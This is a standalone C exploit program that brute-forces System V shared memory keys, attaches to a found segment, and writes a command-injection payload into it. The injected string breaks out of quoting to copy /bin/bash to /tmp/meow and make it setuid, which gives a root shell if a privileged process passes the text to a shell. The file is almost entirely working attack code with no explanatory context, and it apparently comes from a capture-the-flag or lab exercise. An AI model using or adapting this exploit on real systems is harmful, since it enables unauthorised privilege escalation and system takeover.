#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#define SHM_SIZE 1024
#define MAX_TRIES 100000
#define PAYLOAD "Leaked hash detected > '; cp /bin/bash /tmp/meow; chmod 4755 /tmp/meow;#"

int main() {
    key_t key;
    int shmid;
    char *shmaddr;
    int attempts = 0;

    srand(time(NULL));

    while (attempts < MAX_TRIES) {
        key = rand() % 0xFFFFF; 

        shmid = shmget(key, SHM_SIZE, 0);
        if (shmid != -1) {
            printf("[+] Found valid shared memory segment with key: 0x%X (attempt %d)\n", key, attempts);

            shmaddr = shmat(shmid, NULL, 0);
            if (shmaddr == (char *)-1) {
                perror("[-] Failed to attach to shared memory");
            } else {
                printf("[*] Writing payload to shared memory...\n");
                strncpy(shmaddr, PAYLOAD, SHM_SIZE - 1);
                shmaddr[SHM_SIZE - 1] = '\0';

                if (shmdt(shmaddr) == -1) {
                    perror("[-] Failed to detach from shared memory");
                } else {
                    printf("[+] Payload injected and detached successfully.\n");
                }
                break;
            }
        }

        attempts++;
    }

    if (attempts == MAX_TRIES) {
        printf("[-] Exhausted %d attempts without finding a valid segment.\n", MAX_TRIES);
    }

    return 0;
}
